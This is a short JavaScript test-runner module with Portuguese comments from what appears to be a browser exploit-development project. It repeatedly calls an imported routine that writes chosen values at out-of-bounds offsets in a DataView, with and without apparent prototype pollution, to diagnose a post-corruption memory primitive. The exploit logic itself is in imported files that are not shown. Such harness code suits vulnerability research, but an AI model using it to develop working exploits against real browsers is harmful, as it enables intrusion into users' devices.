// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeOOBWriteAndCheckPrimitive } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; // <<<< ADICIONE ESTA LINHA DE IMPORTAÇÃO

async function runPrimitiveDiagnostics() {
    const FNAME_RUNNER = "runPrimitiveDiagnostics";
    logS3(`==== INICIANDO Diagnóstico da Primitiva OOB Pós-Corrupção ====`, 'test', FNAME_RUNNER);

    // Agora OOB_CONFIG estará definido aqui
    const offsetCritico = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    const valuesToTest = [
        { desc: "Val_FFFF", val: 0xFFFFFFFF },
        { desc: "Val_0000", val: 0x00000000 },
        { desc: "Val_AAAA", val: 0x41414141 },
    ];

    const ppStates = [
        { desc: "COM_PP", applyPP: true },
        { desc: "SEM_PP", applyPP: false },
    ];

    for (const ppState of ppStates) {
        for (const valueTest of valuesToTest) {
            const testDescription = `Diag_${valueTest.desc}_Offset0x70_${ppState.desc}`;
            logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
            await executeOOBWriteAndCheckPrimitive(
                testDescription,
                offsetCritico,
                valueTest.val,
                ppState.applyPP
            );
            await PAUSE_S3(MEDIUM_PAUSE_S3);
        }
    }
    
    const offsetSeguro = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + 100;
    const testDescriptionSeguro = `Diag_Val_FFFF_OffsetSeguro_${offsetSeguro.toString(16)}_COM_PP`;
    logS3(`\n--- Executando Teste: ${testDescriptionSeguro} ---`, 'subtest', FNAME_RUNNER);
    await executeOOBWriteAndCheckPrimitive(
        testDescriptionSeguro,
        offsetSeguro,
        0xFFFFFFFF,
        true // Com PP
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Diagnóstico da Primitiva OOB Pós-Corrupção CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_DiagnoseOOBPrimitive';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Diagnóstico da Primitiva OOB Pós-Corrupção ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Diagnóstico Primitiva";
    
    await runPrimitiveDiagnostics();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Diagnóstico da Primitiva OOB Pós-Corrupção) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
